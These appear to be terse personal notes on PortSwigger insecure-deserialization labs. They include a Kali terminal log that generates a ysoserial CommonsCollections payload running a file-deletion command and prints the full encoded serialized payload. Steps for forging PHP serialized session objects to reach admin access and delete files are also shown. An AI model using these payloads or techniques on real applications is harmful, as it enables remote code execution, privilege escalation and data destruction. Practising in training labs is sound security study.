[https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization) 

-   login    
-   change token avatar_link
-   O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"russibxh8c6vkhdvy75iyj6g8a88zvb2";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}7

[https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

-   Change session cookie username to administrator
-   error message about invalid access token,
-   Lists access tokens in error msg
-   brute force access tokens there

[https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects) 
-   Login
-   Session cookie put in cyberchef
-   URL decode, Base64 decode
-   Change admin to 1
-   Refresh webpage and access admin panel

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

```
┌──(kali㉿kali)-[/tmp]
└─$ echo  "rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB0ZzMydXd6ejR1MHZ2czR3a3BmemtrNTJ5ZG5jaW4wcXQABndpZW5lcg==" | base64 -d > file
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp]
└─$ file file                             
file: Java serialization data, version 5
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp]
└─$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar                         
--2022-11-17 08:13:22--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [following]
--2022-11-17 08:13:22--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20221117%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20221117T131323Z&X-Amz-Expires=300&X-Amz-Signature=d8ff71166aad1c5c0f84ac0b9311e14766cacf5b74a599c9480cfda4881905c7&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=29955458&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream [following]
--2022-11-17 08:13:22--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20221117%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20221117T131323Z&X-Amz-Expires=300&X-Amz-Signature=d8ff71166aad1c5c0f84ac0b9311e14766cacf5b74a599c9480cfda4881905c7&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=29955458&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59525376 (57M) [application/octet-stream]
Saving to: ‘ysoserial-all.jar’

ysoserial-all.jar                         100%[====================================================================================>]  56.77M  21.9MB/s    in 2.6s    

2022-11-17 08:13:25 (21.9 MB/s) - ‘ysoserial-all.jar’ saved [59525376/59525376]

                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp]
└─$  java -jar ysoserial-all.jar CommonsCollections7 'rm /home/carlos/morale.txt' > payload
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp]
└─$ file payload
payload: Java serialization data, version 5
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp]
└─$ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar                                         130 ⨯
--2022-11-17 08:46:52--  https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
Resolving jitpack.io (jitpack.io)... 104.26.8.99, 104.26.9.99, 172.67.72.129, ...
Connecting to jitpack.io (jitpack.io)|104.26.8.99|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: /com/github/frohoff/ysoserial/master-2874a69f61-1/ysoserial-master-2874a69f61-1.jar [following]
--2022-11-17 08:46:53--  https://jitpack.io/com/github/frohoff/ysoserial/master-2874a69f61-1/ysoserial-master-2874a69f61-1.jar
Reusing existing connection to jitpack.io:443.
HTTP request sent, awaiting response... 200 OK
Length: 59525398 (57M) [application/java-archive]
Saving to: ‘ysoserial-master-SNAPSHOT.jar’

ysoserial-master-SNAPSHOT.jar         100%[======================================================================>]  56.77M  10.7MB/s    in 6.7s    

Last-modified header invalid -- time-stamp ignored.
2022-11-17 08:47:01 (8.46 MB/s) - ‘ysoserial-master-SNAPSHOT.jar’ saved [59525398/59525398]

                                                                                                                                                     
┌──(kali㉿kali)-[/tmp]
└─$ urlencode $(java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64) 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh%20cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u%20cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjM%20AgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv%20Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0%20aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y%20Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy%20MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj%20dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z%20NC5UcmFuc2Zvcm1lcjs5gTr7CNo%2FpQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s%20bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z%20dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p%20bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu%20Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2Bk%20htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph%20dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz%20cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz%20SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj%20b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf%20b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tb%20Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAABqzK%2Frq%2BAAAAMgA5CgADACIH%20ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B%20AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh%20YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy%20aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y%20bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z%20dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl%20cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0%20Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy%20aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu%20L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv%20eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv%20aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1%20TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo%20YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp%20YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5%20c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v%20c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z%20bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50%20ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H%20YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo%20KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50%20eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy%20ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIzMDIwMjI1MTcyNjc5AQAe%20THlzb3NlcmlhbC9Qd25lcjMwMjAyMjUxNzI2Nzk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA%20CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA%20BQAPADgAAAABABMAFAACAAwAAAA%2FAAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA%20AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA%20AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC%20AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex%20AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr%2Bur4AAAAy%20ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx%205mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh%20cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls%20b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA%20GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj%20dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0%20cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB%20sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAA
```

![image](https://user-images.githubusercontent.com/18213722/202464674-3a07a2a5-ba90-4c6a-85e3-b4599923a9fa.png)

It was solved right after that

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons


https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain


https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

